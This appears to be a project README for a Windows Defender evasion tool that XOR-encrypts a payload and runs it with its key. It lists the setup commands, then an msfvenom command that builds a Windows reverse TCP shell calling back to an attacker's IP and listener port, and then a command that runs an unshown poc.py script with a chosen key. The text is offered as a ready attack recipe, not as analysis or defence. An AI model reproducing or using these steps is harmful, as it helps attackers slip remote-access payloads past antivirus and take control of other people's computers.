# BWD
Bypass-Windows-Defender

Bypass Windows Defender by encrypt the payload and execute it with the key at the same time. 

To realise this attack we will xor our payload with a key so WD can't read it and detect it.

```
sudo apt update
sudo apt upgrade
sudo apt install wingw-w64
```

Creation of the payload with msfvenom. For the exemple I take a revershell : 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=@YOUR_IP LPORT=@PORT_LISTENER -f raw >	payload.bin
```

You can now execute poc.py with the key you want to xor the payload :
```
chmod +x poc.py
sudo python3 poc.py secret_key
```

